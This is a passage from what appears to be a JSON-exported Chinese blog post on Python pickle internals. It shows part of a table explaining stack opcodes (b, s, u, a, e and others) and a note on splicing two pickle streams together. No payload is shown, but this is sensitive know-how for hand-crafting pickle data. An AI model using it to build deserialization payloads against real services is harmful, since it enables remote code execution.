的对象压栈</td>\n<td>gn\\n</td>\n<td>对象被压栈</td>\n<td>无</td>\n</tr>\n<tr>\n<td>0</td>\n<td>丢弃栈顶对象</td>\n<td>0</td>\n<td>栈顶对象被丢弃</td>\n<td>无</td>\n</tr>\n<tr>\n<td>b</td>\n<td>使用栈中的第一个元素（储存多个属性名：属性值的字典）对第二个元素（对象实例）进行属性设置</td>\n<td>b</td>\n<td>栈上第一个元素出栈</td>\n<td>无</td>\n</tr>\n<tr>\n<td>s</td>\n<td>将栈的第一个和第二个对象作为 key-value 对，添加或更新到栈的第三个对象（必须为列表或字典，列表以数字作为 key）中</td>\n<td>s</td>\n<td>第一、二个元素出栈，第三个元素（列表或字典）添加新值或被更新</td>\n<td>无</td>\n</tr>\n<tr>\n<td>u</td>\n<td>寻找栈中的上一个 MARK，组合之间的数据（数据必须有偶数个，即呈 key-value 对）并全部添加或更新到该 MARK 之前的一个元素（必须为字典）中</td>\n<td>u</td>\n<td>MARK 标记以及被组合的数据出栈，字典被更新</td>\n<td>无</td>\n</tr>\n<tr>\n<td>a</td>\n<td>将栈的第一个元素 append 到第二个元素 (列表) 中</td>\n<td>a</td>\n<td>栈顶元素出栈，第二个元素（列表）被更新</td>\n<td>无</td>\n</tr>\n<tr>\n<td>e</td>\n<td>寻找栈中的上一个 MARK，组合之间的数据并 extends 到该 MARK 之前的一个元素（必须为列表）中</td>\n<td>e</td>\n<td>MARK 标记以及被组合的数据出栈，列表被更新</td>\n<td>无</td>\n</tr>\n</tbody>\n</table>\n<h4 id=\"拼接opcode\"><a class=\"anchor\" href=\"#拼接opcode\">#</a> 拼接 opcode</h4>\n<p>将第一个 pickle 流结尾表示结束的。去掉，将第二个 pickle 流与第一个拼接起来即可。</p>\n",
            "tags": [
                "Python",
                "Python"
            ]
        }
    ]
}